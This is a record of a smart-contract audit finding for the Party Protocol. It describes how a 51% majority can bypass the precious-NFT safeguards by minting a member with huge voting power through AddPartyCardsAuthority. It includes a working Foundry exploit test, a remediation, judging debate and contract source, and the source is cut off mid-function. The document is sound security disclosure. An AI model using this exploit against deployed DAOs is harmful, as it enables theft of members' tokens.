{
  "Title": "[H-01] The 51% majority can hijack the party's precious tokens through an arbitrary call proposal if the `AddPartyCardsAuthority` contract is added as an authority in the party.",
  "Content": "\n### Pre-requisite knowledge & an overview of the features in question\n\n1. **The [**`AddPartyCardsAuthority`**](https://github.com/code-423n4/2023-10-party/blob/main/contracts/authorities/AddPartyCardsAuthority.sol) contract:** The `AddPartyCardsAuthority` contract is a contract designed to be integrated into a Party and it has only one purpose - to mint new party governance NFT tokens for party members.\n    - The party has to add this contract as an authority before it can start minting new party governance NFT tokens for users.\n    - The `AddPartyCardsAuthority` contract is deployed on the mainnet on address `0xC534bb3640A66fAF5EAE8699FeCE511e1c331cAD`\n\n2. **The 51% Majority attack:** The PartyDAO team has put a lot of safeguards on a type of proposal called `ArbitraryCallsProposal` to prevent the 51% majority of the party to steal the precious NFT tokens of the party through this type of proposal. For a precious NFT token to be transferred out of the party to any other entity through this proposal, the proposal needs to be unanimously voted (100% of party members have voted on that proposal).\n\n### Overview of the vulnerability\n\nThere is no check on the [`ArbitraryCallsProposal`](https://github.com/code-423n4/2023-10-party/blob/main/contracts/proposals/ArbitraryCallsProposal.sol) contract that prevents the calling of the [`AddPartyCardsAuthority`](https://github.com/code-423n4/2023-10-party/blob/main/contracts/authorities/AddPartyCardsAuthority.sol) contract. This allows the 51% majority, through an arbitrary call proposal, to hijack ALL of precious tokens of the party.\n\nThey can achieve this by going through the following steps:\n\n1. Create an `ArbitraryCallsProposal` to simply mint a governance NFT token for an arbitrary user with an astronomical voting power, which gives the arbitrary user an ability to pass and bypass the execution delay of any proposal.\n2. The newly-created arbitrary user will create an `ArbitraryCallsProposal` with multiple arbitrary calls with a goal of transferring all of the party precious tokens to themselves.\n3. The newly-created arbitrary user will then vote on the `ArbitraryCallsProposal` proposal they just created.\n4. The proposal will pass and be marked as a unanimously voted proposal, allowing them to bypass all of the safeguards in place to prevent the hijacking of precious NFT tokens through a non-unanimously voted proposal.\n\n### Proof of concept\n\n1. Add the following code to a file with a name of your liking with an extension of \".t.sol\".\n2. Add the created file to the [`test/`](https://github.com/PartyDAO/party-protocol/tree/main/test) folder\n3. Run the following command: `forge test --match-contract TestHijackPreciousTokens --match-test testHijackPreciousExploit -vv`\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8;\n\nimport { Vm } from \"forge-std/Test.sol\";\nimport { TestUtils } from \"./TestUtils.sol\";\nimport { IERC721 } from \"../contracts/tokens/IERC721.sol\";\nimport { GlobalsAdmin } from \"./TestUsers.sol\";\nimport { PartyFactory } from \"../contracts/party/PartyFactory.sol\";\nimport { Globals } from \"../contracts/globals/Globals.sol\";\nimport { Party } from \"../contracts/party/Party.sol\";\nimport { ProposalExecutionEngine } from \"../contracts/proposals/ProposalExecutionEngine.sol\";\nimport { IFractionalV1VaultFactory } from \"../contracts/proposals/vendor/FractionalV1.sol\";\nimport { MockZoraReserveAuctionCoreEth } from \"./proposals/MockZoraReserveAuctionCoreEth.sol\";\nimport { IReserveAuctionCoreEth } from \"../contracts/vendor/markets/IReserveAuctionCoreEth.sol\";\nimport { PartyGovernance } from \"../contracts/party/PartyGovernance.sol\";\nimport { ERC721Receiver } from \"../contracts/tokens/ERC721Receiver.sol\";\nimport { MetadataRegistry } from \"../contracts/renderers/MetadataRegistry.sol\";\nimport { TokenDistributor } from \"../contracts/distribution/TokenDistributor.sol\";\nimport { OffChainSignatureValidator } from \"../contracts/signature-validators/OffChainSignatureValidator.sol\";\nimport {ArbitraryCallsProposal} from \"../contracts/proposals/ArbitraryCallsProposal.sol\";\nimport {IProposalExecutionEngine} from \"../contracts/proposals/IProposalExecutionEngine.sol\";\nimport {AddPartyCardsAuthority} from \"../contracts/authorities/AddPartyCardsAuthority.sol\";\nimport {DummyERC721} from \"./DummyERC721.sol\";\nimport \"../contracts/utils/LibRawResult.sol\";\nimport \"forge-std/console.sol\";\n\n/// @notice This contract provides a fully functioning party instance for testing.\n///     Run setup from inheriting contract.\nabstract contract SetupPartyHelper is TestUtils, ERC721Receiver {\n\n    bool private immutable _isForked;\n    GlobalsAdmin internal globalsAdmin;\n    Party internal party;\n    Party internal partyImpl;\n    Globals internal globals;\n    PartyFactory internal partyFactory;\n    TokenDistributor internal tokenDistributor;\n    ProposalExecutionEngine pe;\n    AddPartyCardsAuthority addPartyCards;\n    uint256 partyTotalVotingPower;\n\n    struct PartyMembersVotingPowers {\n        uint96 User_John_Votes;\n        uint96 User_Danny_Votes;\n        uint96 User_Steve_Votes;\n        uint96 User_Adam_Votes;\n        uint96 User_Jack_Votes;\n        uint96 User_Josh_Votes;\n    }\n\n    /** -------------------------- Party Authority -------------------------- */\n\n    // Test authority member with dummy randomly generated address\n    address internal authorityTestUser = vm.addr(1);\n\n    /** -------------------------- Party Members -------------------------- */\n\n    // Test members with dummy randomly generated addresses\n    address internal user_john = vm.addr(2);\n    address internal user_danny = vm.addr(3);\n    address internal user_steve = vm.addr(4);\n\n    // Voting power of each party member\n    uint96 internal johnVotes;\n    uint96 internal dannyVotes;\n    uint96 internal steveVotes;\n\n    /** -------------------------- Party Hosts -------------------------- */\n\n    // Test hosts with dummy randomly generated addresses\n    address internal host_adam = vm.addr(5);\n    address internal host_jack = vm.addr(6);\n    address internal host_josh = vm.addr(7);\n\n    // Voting power of each party host\n    uint96 internal adamVotes;\n    uint96 internal jackVotes;\n    uint96 internal joshVotes;\n\n    /** -------------------------- Party precious tokens -------------------------- */\n\n    DummyERC721 internal erc721PreciousToken = new DummyERC721();\n\n    IERC721[] internal preciousTokens = new IERC721[](2);\n    uint256[] internal preciousTokenIds = new uint256[](2);\n\n\n    constructor(bool isForked) {\n        _isForked = isForked;\n    }\n\n    function CreateNewParty(\n        PartyMembersVotingPowers memory votingPowers,\n        string memory partyName,\n        string memory partySymbol,\n        uint40 voteDuration,\n        uint40 executionDelay,\n        uint16 passThresholdBps,\n        bool allowArbCallsToSpendPartyEth,\n        bool distributionsRequireVote\n    ) public {\n        Party.PartyOptions memory opts;\n\n        adamVotes = votingPowers.User_Adam_Votes;\n        jackVotes = votingPowers.User_Jack_Votes;\n        joshVotes = votingPowers.User_Josh_Votes;\n\n        johnVotes = votingPowers.User_John_Votes;\n        dannyVotes = votingPowers.User_Danny_Votes;\n        steveVotes = votingPowers.User_Steve_Votes;\n\n        address[] memory hosts = new address[](0);\n\n        opts.name = partyName;\n        opts.symbol = partySymbol;\n        opts.governance.hosts = hosts;\n        opts.governance.voteDuration = voteDuration;\n        opts.governance.executionDelay = executionDelay;\n        opts.governance.passThresholdBps = passThresholdBps;\n        opts.proposalEngine.allowArbCallsToSpendPartyEth = allowArbCallsToSpendPartyEth;\n        opts.proposalEngine.distributionsRequireVote = distributionsRequireVote;\n        opts.governance.totalVotingPower = johnVotes + dannyVotes + steveVotes + adamVotes + joshVotes + jackVotes;  \n        partyTotalVotingPower = opts.governance.totalVotingPower;\n\n        initialize(opts);      \n    }\n\n    function initialize(Party.PartyOptions memory opts) internal virtual {\n        globalsAdmin = new GlobalsAdmin();\n        globals = globalsAdmin.globals();\n        partyImpl = new Party(globals);\n        address globalDaoWalletAddress = address(420);\n        globalsAdmin.setGlobalDaoWallet(globalDaoWalletAddress);\n\n        pe = new ProposalExecutionEngine(\n            globals,\n            _isForked\n                ? IReserveAuctionCoreEth(0x5f7072E1fA7c01dfAc7Cf54289621AFAaD2184d0)\n                : new MockZoraReserveAuctionCoreEth(),\n            _isForked\n                ? IFractionalV1VaultFactory(0x85Aa7f78BdB2DE8F3e0c0010d99AD5853fFcfC63)\n                : IFractionalV1VaultFactory(address(0))\n        );\n\n        globalsAdmin.setProposalEng(address(pe));\n\n        partyFactory = new PartyFactory(globals);\n        globalsAdmin.setGlobalPartyFactory(address(partyFactory));\n\n        tokenDistributor = new TokenDistributor(globals, 0);\n        globalsAdmin.setTokenDistributor(address(tokenDistributor));\n\n        address[] memory registrars = new address[](2);\n        registrars[0] = address(this);\n        registrars[1] = address(partyFactory);\n        MetadataRegistry metadataRegistry = new MetadataRegistry(globals, registrars);\n        globalsAdmin.setMetadataRegistry(address(metadataRegistry));\n\n        OffChainSignatureValidator offChainGlobalValidator = new OffChainSignatureValidator();\n        globalsAdmin.setOffChainSignatureValidator(address(offChainGlobalValidator));\n\n        addPartyCards = new AddPartyCardsAuthority();\n\n        address[] memory authorities = new address[](1);\n        authorities[0] = authorityTestUser;\n\n        // Mint two precious tokens\n        uint256 firstPreciousTokenId = erc721PreciousToken.mint(address(this)); // NFT ID 1\n        uint256 secondPreciousTokenId = erc721PreciousToken.mint(address(this)); // NFT ID 2\n\n        preciousTokens[0] = IERC721(address(erc721PreciousToken));\n        preciousTokens[1] = IERC721(address(erc721PreciousToken));\n        preciousTokenIds[0] = firstPreciousTokenId;\n        preciousTokenIds[1] = secondPreciousTokenId;\n\n        party = partyFactory.createParty(\n            partyImpl,\n            authorities,\n            opts,\n            preciousTokens,\n            preciousTokenIds,\n            0\n        );\n\n        // Approve the created party to spend the two precious tokens.\n        erc721PreciousToken.transferFrom(address(this), address(party), firstPreciousTokenId);\n        erc721PreciousToken.transferFrom(address(this), address(party), secondPreciousTokenId);\n\n        vm.startPrank(authorityTestUser);\n\n        // Give party members voting powers\n        party.mint(user_john, johnVotes, user_john);\n        party.mint(user_danny, dannyVotes, user_danny);\n        party.mint(user_steve, steveVotes, user_steve);\n\n        // Give party members voting powers\n        party.mint(host_adam, adamVotes, host_adam);\n        party.mint(host_jack, jackVotes, host_jack);\n        party.mint(host_josh, joshVotes, host_josh);\n\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1);\n    }\n\n}\n\ncontract TestHijackPreciousTokens is SetupPartyHelper {\n\n    constructor() SetupPartyHelper(false) {}\n\n    /** ------ Create a new party ------ */\n    function setUp() public { \n\n        PartyMembersVotingPowers memory votingPowers = PartyMembersVotingPowers({\n            User_John_Votes: 50 ether,\n            User_Danny_Votes: 50 ether,\n            User_Steve_Votes: 50 ether,\n            User_Adam_Votes: 50 ether,\n            User_Jack_Votes: 50 ether,\n            User_Josh_Votes: 50 ether\n        });\n\n        super.CreateNewParty(\n            votingPowers,\n            \"TestParty\",\n            \"PRT\",\n            100,\n            0, // setting the execution delay as zero for the poc\n            5000, // 50% of members have to accept the proposal for it go through\n            true,\n            true\n        );\n\n        // Add `AddPartyCardsAuthority` contract as an authority\n        vm.prank(address(party));\n        party.addAuthority(address(addPartyCards));\n\n    }\n\n    function testHijackPreciousExploit() public {\n\n        /** ----------------------- [STAGE 1] ----------------------- */\n        /**\n        * [Stage 1] of the exploit objectives:\n        *  -  Through an arbitrary call (unanimous proposal),\n        *      mint an arbitrary address `attacker` an astronomical voting power.\n        */\n\n        address attacker = vm.addr(48748743784378);\n\n        ArbitraryCallsProposal.ArbitraryCall[] memory calls = new ArbitraryCallsProposal.ArbitraryCall[](1);\n\n        address[] memory newPartyMembers = new address[](1);\n        uint96[] memory newPartyMemberVotingPowers = new uint96[](1);\n        address[] memory initialDelegates = new address[](1);\n\n        newPartyMembers[0] = attacker;\n        newPartyMemberVotingPowers[0] = 7922816251426433759354395;\n        initialDelegates[0] = address(0);\n\n        /** ------------ Non-unanimous `ArbitraryCall` proposal ------------ */\n\n        calls[0] = createArbitraryCall(\n            address(addPartyCards),\n            abi.encodeWithSelector(AddPartyCardsAuthority.addPartyCards.selector, newPartyMembers, newPartyMemberVotingPowers, initialDelegates)\n        );\n\n        PartyGovernance.Proposal memory test_proposal = createArbitraryCallProposal(calls);\n\n        vm.prank(user_john);\n        uint256 proposalId = party.propose(test_proposal, 0);\n\n        vm.prank(user_danny);\n        party.accept(proposalId, 0);\n\n        vm.prank(user_steve);\n        party.accept(proposalId, 0);\n\n        vm.prank(user_john);\n        party.execute(\n            proposalId,\n            test_proposal,\n            preciousTokens,\n            preciousTokenIds,\n            \"\",\n            \"\"\n        );\n\n        vm.warp(block.timestamp + 5);\n\n        /** ----------------------- [STAGE 2] ----------------------- */\n        /**\n        * [Stage 2] of the exploit objectives:\n        *  -  Hijack the two precious tokens of the party\n        * \n        *  The attacker will simply create an `ArbitraryCall` proposal to transfer the two precious tokens to him\n        *  Since the attacker was minted voting power equivalent to the total voting power, \n        *      the proposal will be marked as unanimous, bypassing the execution delay and precious NFT safeguards.\n        */\n\n        calls = new ArbitraryCallsProposal.ArbitraryCall[](2);\n\n        calls[0] = createArbitraryCall(\n            address(preciousTokens[0]),\n            abi.encodeWithSelector(IERC721.transferFrom.selector, address(party), address(attacker), preciousTokenIds[0])\n        );\n\n        calls[1] = createArbitraryCall(\n            address(preciousTokens[1]),\n            abi.encodeWithSelector(IERC721.transferFrom.selector, address(party), address(attacker), preciousTokenIds[1])\n        );\n\n        test_proposal = createArbitraryCallProposal(calls);\n\n        // The proposal will pass, will be marked as unanimous and it'll be ready to execute.\n\n        vm.startPrank(attacker);\n\n        proposalId = party.propose(test_proposal, 1);\n\n        party.execute(\n            proposalId,\n            test_proposal,\n            preciousTokens,\n            preciousTokenIds,\n            \"\",\n            \"\"\n        );\n\n        vm.stopPrank();\n\n    }\n\n\n\n    struct ArbitraryCall {\n        address payable target;\n        uint256 value;\n        bytes data;\n        bytes32 expectedResultHash;\n    }\n\n    function createArbitraryCallProposal(ArbitraryCallsProposal.ArbitraryCall[] memory calls) public pure returns(PartyGovernance.Proposal memory) {\n        return PartyGovernance.Proposal({\n            maxExecutableTime: uint40(999999999999),\n            cancelDelay: 10000,\n            proposalData: abi.encodeWithSelector(\n                bytes4(uint32(ProposalExecutionEngine.ProposalType.ArbitraryCalls)),\n                calls\n            )\n        });\n    }\n\n\n    function createArbitraryCall(\n        address arbitraryCallTarget,\n        bytes memory targetData\n    )\n        private\n        pure\n        returns (ArbitraryCallsProposal.ArbitraryCall memory)\n    {\n        return ArbitraryCallsProposal.ArbitraryCall({\n                target: payable(address(arbitraryCallTarget)),\n                value: 0,\n                data: targetData,\n                expectedResultHash: bytes32(0)\n            });\n    }\n\n\n}\n```\n\n</details>\n\n### Remediation\n\nIn the function [`_isCallAllowed`](https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/proposals/ArbitraryCallsProposal.sol#L159) in [`ArbitraryCallsProposal`](https://github.com/code-423n4/2023-10-party/blob/main/contracts/proposals/ArbitraryCallsProposal.sol), add a check to prevent an arbitrary call from calling the contract `AddPartyCardsAuthority`. Or add a check to prevent an arbitrary call with a function selector, equivalent to that of the [`addPartyCards`](https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/authorities/AddPartyCardsAuthority.sol#L29) function in the `ArbitraryPartyCardsAuthority` contract, to be executed.\n\n### Assessed type\n\nToken-Transfer\n\n**[KingNFT (lookout) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1806760560):**\n > A malicious `AddPartyCardsAuthority` proposal could be rejected by hosts during the `ExecutionDelay` phase - the likelihood of a success attack is not too high.\n> \n> M might be more appropriate.\n\n**[0xble (Party) acknowledged and commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1811256897):**\n > Valid, although likely will not fix, as we've been debating removing the precious mechanism in a subsequent release. In additional to what @KingNFT pointed out, members can also use rage quit to exit if enabled.\n\n**[arr00 (Party) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1813089870):**\n > An additional detail to add is that parties utilizing precious tokens would set their `enableAddAuthority` flag to `false` which would disable adding authorities. See [here](https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/proposals/ProposalExecutionEngine.sol#L272-L274).\n\n**[gzeon (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1817860707):**\n > While governance attacks are typically out-of-scope, this attack specifically bypasses the precious mechanism, which I believe will make it reasonable to consider this as a valid medium.\n\n**[0xStalin (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1822182849):**\n> I would like to  mention that I believe it's unfair to treat this report as a medium when the PartyDAO team considers this vulnerability to be high/severe.[ In their bug bounty program table](https://github.com/PartyDAO/party-protocol#bug-bounty) they specifically mention \"bypass guardrails to transfer precious NFT from parties\" to be a severe level vulnerability\n> \n> Additionally, looking at one of the audit reports they received from a firm (https://github.com/PartyDAO/party-protocol/blob/main/audits/Party-Protocol-Macro-Audit.pdf), one of the high severity findings listed is similar to the bug in question, just a different way to bypass the precious NFT token guardrails (and it was acknowledged and fixed).\n> \n> It's worth mentioning that they consider it a high severity vulnerability only if the majority is able to hijack the precious NFT tokens through `ArbitraryCallsProposal` only and not any other type of proposal. This report clearly demonstrates the ability for an attacker to hijack the precious tokens through `ArbitraryCallsProposal`.\n\n**[deth (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1822478383):**\n> I would like to point out that a majority attack has been acknowledged in a previous [c4 finding](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1532040736).\n> \n> Issue #124 was judged as invalid because it was reported in a previous [c4 finding as well](https://github.com/code-423n4/2023-05-party-findings/issues/19).\n\n**[0xStalin (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1823247602):**\n> @deth - The previous C4 finding is about how an attacker can (under some circumstances/conditions) execute a flash loan attack to get 51% voting power and (potentially) create proposals and get them to pass if no host has vetoed on them.\n>\n> The finding in question here, is discussing how the 51% majority is able to hijack precious NFT tokens through an arbitrary call proposal when the intended behavior is to be able to transfer the precious NFT tokens out of a party through an arbitrary call proposal ONLY IF the proposal was voted on by 100% of the party members and not just the majority. The PartyDAO team has put several safeguards to prevent the transfer of those precious tokens through an arbitrary call proposal if it has not been unanimously voted (unanimous vote `== 100%` of the party members voted on the proposal).\n>\n> The finding in question bypasses all those mitigations. I made the case why this is a high severity vulnerability not a medium one, in my previous comment.\n\n**[deth (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1823319878):**\n> @0xStalin - I agree that this report is nuanced, but isn't Stage 1 of the issue a majority attack?\n> \n> > The 51% majority can hijack precious tokens of a party through an arbitrary call proposal.\n> \n> > The finding in question is discussing how the 51% majority is able to hijack precious NFT\n> \n> You also state it passes all mitigations and safeguards, but the `executionDelay` of the Party is set to `0` in the PoC. The `executionDelay` in itself is a safeguard.\n> \n> Quote from the [previous finding](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1532040736).\n> > The expectation is parties will have reasonable governance settings and active governance to veto malicious proposals to manage the risk of a majority attack and if they don't (e.g. set an execution delay of `0`) it is a deliberate choice on their part rather than a vulnerability.\n> \n> Will this attack still work, if `executionDelay != 0`, because it's the hosts responsibility to veto these sorts of proposals and it's their error if `executionDelay ` is set to `0` in the first place? \n\n**[0xStalin (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1823835157):**\n> @deth - So there are multiple things I need to point out in regards to the context of the bug in question.\n> \n> When I point out that it bypasses all mitigations and safeguards, I'm talking about the safeguards implemented in the `ArbitraryCallsProposal` specifically, the `executionDelay` is out of question and I'll explain why in my next point. You can see the precious NFT safeguards implemented in `ArbitraryCallsProposal` lines 185-215 and lines 63-104.\n> \n> This begs the question: okay why `ArbitraryCallsProposal` specifically is an issue? The majority can actually execute this attack by adding a new authority through `AddAuthorityProposal` and hijack those tokens or they can hijack those through other proposals.\n>\n> The thing with `ArbitraryCallsProposal`, specifically, is that it can execute any arbitrary logic and does NOT have defined actions and defined risk (I'm quoting the sponsor here). A single party member/attacker can very easily trick the majority into accepting this proposal and hijack those tokens, so it doesn't even have to be the 51% majority trying to steal them.\n>\n> This was the sponsor's response when asked why do they consider hijacking precious tokens through a unanimously voted `ArbitraryCallProposal` a vulnerability while the same can be achieved using other proposals:\n>> \"It is more dangerous because it can execute any arbitrary logic whereas other proposals have defined actions and defined risk.\"\n>\n> and that's really why the `executionDelay` protection is not so relevant here.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1824391496):**\n > This is not a duplicate of [this previous c4 finding](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1532040736). `executionDelay` is not relevant here, as it is relevant in the other issue where it prevents the same block execution with a flashloan. That issue also does NOT bypass precious mechanism.\n> \n> However, both contracts in question here ()`AddPartyCardsAuthority` and `ArbitraryCallsProposal`) are actually [out-of-scope](https://github.com/code-423n4/2023-10-party/blob/main/scope.txt) for this audit. So despite this, it seems to be a valid bypass with sponsor acknowledgment, this would be considered as out-of-scope and you should report it to [PartyDAO bug bounty program](https://github.com/PartyDAO/party-protocol#bug-bounty) instead.\n\n**[0xStalin (warden) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1824646266):**\n> @gzeon - The `ProposalExecutionEngine` contract implements the `ArbitraryCallsProposal` contract so the `ArbitraryCallsProposal` contract is in-scope as well as all the other contracts which the `ProposalExecutionEngine` contract extends, isn't it?\n> \n> The `ArbitraryCallsProposal` is an abstract contract and is implemented by the `ProposalExecutionEngine` which would make it an in-scope asset, isn't it?\n> \n> Secondly, while the `AddPartyCardsAuthority` is OOS, the issue does NOT exist in this contract in the first place. The issue exists in `ArbitraryCallsProposal` contract. It's just that when `AddPartyCardsAuthority` is added to a party to extend the functionality, this becomes an issue and precious tokens can easily be hijacked.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1824663461):**\n > Reviewing again, thanks for the correction.\n\n**[gzeon (judge) increased severity to High and commented](https://github.com/code-423n4/2023-10-party-findings/issues/533#issuecomment-1824683119):**\n > Agree to pump this to High after considering [PartyDAO bug bounty program](https://github.com/PartyDAO/party-protocol#bug-bounty) and the fact that guardrail can be bypassed to steal tokens.\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-10-party",
  "Code": [
    {
      "filename": "contracts/proposals/ArbitraryCallsProposal.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.20;\n\nimport \"../tokens/IERC721.sol\";\nimport \"../tokens/IERC721Receiver.sol\";\nimport \"../tokens/ERC1155Receiver.sol\";\nimport \"../utils/LibSafeERC721.sol\";\nimport \"../utils/LibAddress.sol\";\nimport \"../vendor/markets/IReserveAuctionCoreEth.sol\";\nimport \"./vendor/IOpenseaExchange.sol\";\n\nimport \"./LibProposal.sol\";\nimport \"./IProposalExecutionEngine.sol\";\n\n// Implements arbitrary call proposals. Inherited by the `ProposalExecutionEngine`.\n// This contract will be delegatecall'ed into by `Party` proxy instances.\ncontract ArbitraryCallsProposal {\n    using LibSafeERC721 for IERC721;\n    using LibAddress for address payable;\n\n    struct ArbitraryCall {\n        // The call target.\n        address payable target;\n        // Amount of ETH to attach to the call.\n        uint256 value;\n        // Calldata.\n        bytes data;\n        // Hash of the successful return data of the call.\n        // If 0x0, no return data checking will occur for this call.\n        bytes32 expectedResultHash;\n    }\n\n    error PreciousLostError(IERC721 token, uint256 tokenId);\n    error CallProhibitedError(address target, bytes data);\n    error ArbitraryCallFailedError(bytes revertData);\n    error UnexpectedCallResultHashError(\n        uint256 idx,\n        bytes32 resultHash,\n        bytes32 expectedResultHash\n    );\n    error NotEnoughEthAttachedError(uint256 callValue, uint256 ethAvailable);\n    error InvalidApprovalCallLength(uint256 callDataLength);\n\n    event ArbitraryCallExecuted(uint256 proposalId, uint256 idx, uint256 count);\n\n    IReserveAuctionCoreEth private immutable _ZORA;\n\n    constructor(IReserveAuctionCoreEth zora) {\n        _ZORA = zora;\n    }\n\n    function _executeArbitraryCalls(\n        IProposalExecutionEngine.ExecuteProposalParams memory params,\n        bool allowArbCallsToSpendPartyEth\n    ) internal returns (bytes memory nextProgressData) {\n        // Get the calls to execute.\n        ArbitraryCall[] memory calls = abi.decode(params.proposalData, (ArbitraryCall[]));\n        // Check whether the proposal was unanimously passed.\n        bool isUnanimous = params.flags & LibProposal.PROPOSAL_FLAG_UNANIMOUS ==\n            LibProposal.PROPOSAL_FLAG_UNANIMOUS;\n        // If not unanimous, keep track of which preciouses we had before the calls\n        // so we can check that we still have them later.\n        bool[] memory hadPreciouses = new bool[](params.preciousTokenIds.length);\n        if (!isUnanimous) {\n            for (uint256 i; i < hadPreciouses.length; ++i) {\n                hadPreciouses[i] = _getHasPrecious(\n                    params.preciousTokens[i],\n                    params.preciousTokenIds[i]\n                );\n            }\n        }\n        // If we're not allowing arbitrary calls to spend the Party's ETH, only\n        // allow forwarded ETH attached to the call to be spent.\n        uint256 ethAvailable = allowArbCallsToSpendPartyEth ? address(this).balance : msg.value;\n        for (uint256 i; i < calls.length; ++i) {\n            // Execute an arbitrary call.\n            _executeSingleArbitraryCall(\n                i,\n                calls,\n                params.preciousTokens,\n                params.preciousTokenIds,\n                isUnanimous,\n                ethAvailable\n            );\n            // Update the amount of ETH available for the subsequent calls.\n            ethAvailable = allowArbCallsToSpendPartyEth\n                ? address(this).balance\n                : ethAvailable - calls[i].value;\n            emit ArbitraryCallExecuted(params.proposalId, i, calls.length);\n        }\n        // If not a unanimous vote and we had a precious beforehand,\n        // ensure that we still have it now.\n        if (!isUnanimous) {\n            for (uint256 i; i < hadPreciouses.length; ++i) {\n                if (hadPreciouses[i]) {\n                    if (!_getHasPrecious(params.preciousTokens[i], params.preciousTokenIds[i])) {\n                        revert PreciousLostError(\n                            params.preciousTokens[i],\n                            params.preciousTokenIds[i]\n                        );\n                    }\n                }\n            }\n        }\n        // Refund leftover ETH attached to the call if none was spent from the\n        // Party's balance.\n        if (!allowArbCallsToSpendPartyEth && ethAvailable > 0) {\n            payable(msg.sender).transferEth(ethAvailable);\n        }\n        // No next step, so no progressData.\n        return \"\";\n    }\n\n    function _executeSingleArbitraryCall(\n        uint256 idx,\n        ArbitraryCall[] memory calls,\n        IERC721[] memory preciousTokens,\n        uint256[] memory preciousTokenIds,\n        bool isUnanimous,\n        uint256 ethAvailable\n    ) private {\n        ArbitraryCall memory call = calls[idx];\n        // Check that the call is not prohibited.\n        if (\n            !_isCallAllowed(call, isUnanimous, idx, calls.length, preciousTokens, preciousTokenIds)\n        ) {\n            revert CallProhibitedError(call.target, call.data);\n        }\n        // Check that we have enough ETH to execute the call.\n        if (ethAvailable < call.value) {\n            revert NotEnoughEthAttachedError(call.value, ethAvailable);\n        }\n        // Execute the call.\n        (bool s, bytes memory r) = call.target.call{ value: call.value }(call.data);\n        if (!s) {\n            // Call failed. If not optional, revert.\n            revert ArbitraryCallFailedError(r);\n        } else {\n            // Call succeeded.\n            // If we have a nonzero expectedResultHash, check that the result data\n            // from the call has a matching hash.\n            if (call.expectedResultHash != bytes32(0)) {\n                bytes32 resultHash = keccak256(r);\n                if (resultHash != call.expectedResultHash) {\n                    revert UnexpectedCallResultHashError(idx, resultHash, call.expectedResultHash);\n                }\n            }\n        }\n    }\n\n    // Do we possess the precious?\n    function _getHasPrecious(\n        IERC721 preciousToken,\n        uint256 preciousTokenId\n    ) private view returns (bool hasPrecious) {\n        hasPrecious = preciousToken.safeOwnerOf(preciousTokenId) == address(this);\n    }\n\n    function _isCallAllowed(\n        ArbitraryCall memory call,\n        bool isUnanimous,\n        uint256 callIndex,\n        uint256 callsCount,\n        IERC721[] memory preciousTokens,\n        uint256[] memory preciousTokenIds\n    ) private view returns (bool isAllowed) {\n        // Cannot call ourselves.\n        if (call.target == address(this)) {\n            return false;\n        }\n        if (call.data.length >= 4) {\n            // Get the function selector of the call (first 4 bytes of calldata).\n            bytes4 selector;\n            {\n                bytes memory callData = call.data;\n                assembly {\n                    selector := and(\n                        mload(add(callData, 32)),\n                        0xffffffff00000000000000000000000000000000000000000000000000000000\n                    )\n                }\n            }\n            // Non-unanimous proposals restrict what ways some functions can be\n            // called on a precious token.\n            if (!isUnanimous) {\n                // Cannot call `approve()` or `setApprovalForAll()` on the precious\n                // unless it's to revoke approvals.\n                if (selector == IERC721.approve.selector) {\n                    // Can only call `approve()` on the precious if the operator is null.\n                    (address op, uint256 tokenId) = _decodeApproveCallDataArgs(call.data);\n                    if (op != address(0)) {\n                        return\n                            !LibProposal.isTokenIdPrecious(\n                                IERC721(call.target),\n                                tokenId,\n                                preciousTokens,\n                                preciousTokenIds\n                            );\n                    }\n                    // Can only call `setApprovalForAll()` on the precious if\n                    // toggling off.\n                } else if (selector == IERC721.setApprovalForAll.selector) {\n                    (, bool isApproved) = _decodeSetApprovalForAllCallDataArgs(call.data);\n                    if (isApproved) {\n                        return !LibProposal.isTokenPrecious(IERC721(call.target), preciousTokens);\n                    }\n                    // Can only call cancelAuction on the zora AH if it's the last call\n                    // in the sequence.\n                } else if (selector == IReserveAuctionCoreEth.cancelAuction.selector) {\n                    if (call.target == address(_ZORA)) {\n                        return callIndex + 1 == callsCount;\n                    }\n                }\n            }\n            // Can never call receive hooks on any target.\n            if (\n                selector == IERC721Receiver.onERC721Received.selector ||\n                selector == ERC1155TokenReceiverBase.onERC1155Received.selector ||\n                selector == ERC1155TokenReceiverBase.onERC1155BatchReceived.selector\n            ) {\n                return false;\n            }\n            // Disallow calling `validate()` on Seaport if there are preciouses.\n            if (selector == IOpenseaExchange.validate.selector && preciousTokens.length != 0) {\n                return false;\n            }\n        }\n        // All other calls are allowed.\n        return true;\n    }\n\n    // Get the `operator` and `tokenId` from the `approve()` call data.\n    function _decodeApproveCallDataArgs(\n        bytes memory callData\n    ) private pure returns (address operator, uint256 tokenId) {\n        if (callData.length < 68) {\n            revert InvalidApprovalCallLength(callData.length);\n        }\n        assembly {\n            operator := and(mload(add(callData, 36)), 0xffffffffffffffffffffffffffffffffffffffff)\n            tokenId := mload(add(callData, 68))\n        }\n    }\n\n    // Get the `operator` and `tokenId` from the `setApprovalForAll()` call data.\n    function 